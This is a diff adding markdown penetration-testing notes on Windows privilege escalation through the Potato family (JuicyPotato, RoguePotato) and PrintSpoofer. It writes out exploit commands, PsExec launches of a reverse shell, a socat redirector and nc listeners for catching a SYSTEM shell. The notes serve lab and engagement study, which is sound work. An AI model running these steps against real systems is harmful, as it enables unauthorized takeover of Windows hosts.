@@ -314,5 +314,49 @@ Or Powershell:
 * RottenPotato was quite limited exploit.
 * JuicyPotato works in the same way as RottenPotato but the authors found many more ways to exploit it. [JuicyPotato GitHub](https://github.com/ohpe/juicy-potato)
 * How to get a shell with a service account? 
-** For example if IIS runs with a service account and you can upload an asp shell you would have a reverse shell with that service account
-** Or if you have SQL injection on MSSQL with xp_cmdshell enabled you can get a shell that way with the MSSQL service account
+  * For example if IIS runs with a service account and you can upload an asp shell you would have a reverse shell with that service account
+  * Or if you have SQL injection on MSSQL with xp_cmdshell enabled you can get a shell that way with the MSSQL service account
+* JuicyPotato is fixed on the most recent version of Windows 10
+
+#### PsExec
+1. You can run PsExec with the privileges of a service account to launch an executable of your choice such as a reverse shell. In the example below we will use the local service account which is a built-in service account in windows.
+`.\PsExec64.exe -accepteula -i -u "nt authority\local service" reverse.exe`
+2. Once we have a reverse shell we can check our privileges
+`whoami /priv`
+3. If you have the *SeImpersonatePrivilege* privilege you can run JuicyPotato
+`.\JuicyPotato.exe -l 1337 -p C:\path\to\reverseshell.exe -t * -c {CLSID}`
+Note: The -l must use an available local port, the -c must use a valid CLSID for the version of windows you are on. These CLSID's are available on the JuicyPotato GitHub, as well as a powershell script that can be used to enumerate valid CLSID's
+
+### RoguePotato
+* Latest of the "Potato" exploits
+[GitHub](https://github.com/antonioCoco/RoguePotato)
+[Blog](https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/)
+[Compiled Exploit](https://github.com/antonioCoco/RoguePotato/releases/tag/1.0)
+
+1. In the example, you will need 3 Kali terminal windows.
+2. In the first one you will need to run a socat redirector back to the windows box
+`sudo socat tcp-listen:135,reuseaddr,fork tcp:192.168.X.X:9999`
+3. Then setup nc listener to catch shell from service account running with the *SeImpersonatePrivilege* privilege
+`sudo nc -nlvp 53`
+4. Over on the windows, start an elevated command prompt using the admin windows credentials
+Note: this is only done to simulate getting a shell. In a real engagement you would get a shell a different way then discover the user has the *SeImpersonatePrivilege* or *SeAssignPrimaryToken* privileges.
+5. We will use PsExec to run our reverse shell as the local service account
+`.\PsExec64.exe -accepteula -i -u "nt authority\local service" reverse.exe`
+6. In the third window will run nc to catch the system level shell
+`sudo nc -nlvp 53`
+7. In the local service shell we will run RoguePotato
+`.\RoguePotato.exe -r 192.168.X.X -l 9999 -e C:\path\to\reverseshell.exe`
+Note: -r is kali ip address as its redirector and to listen on port 9999. This is for the socat redirector we set up earlier
+
+### PrintSpoofer
+
+* PrintSpoofer is another exploit that is currently unpatched that targets the print spooler service
+[GitHub](https://github.com/itm4n/PrintSpoofer)
+[Blog](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/)
+* Doesn't require any port forwarding
+1. Once again we need to catch a shell (simulate) for a service account with *SeImpersonatePrivilege* or *SeAssignPrimaryToken* privileges. In one window start a nc listener
+2. Once again start an elevated command prompt to simulate spawning a shell with a service account.
+3. PrintSpoofer.exe requires the Visual C++ redistributable is installed
+4. You will need to transfer and run vc_redist.x64.exe 
+5. Once you get a shell with a service account with the above privileges. You will run PrintSpoofer from this service shell:
+`.\PrintSpoofer.exe -i -c C:\path\to\revereshell.exe`
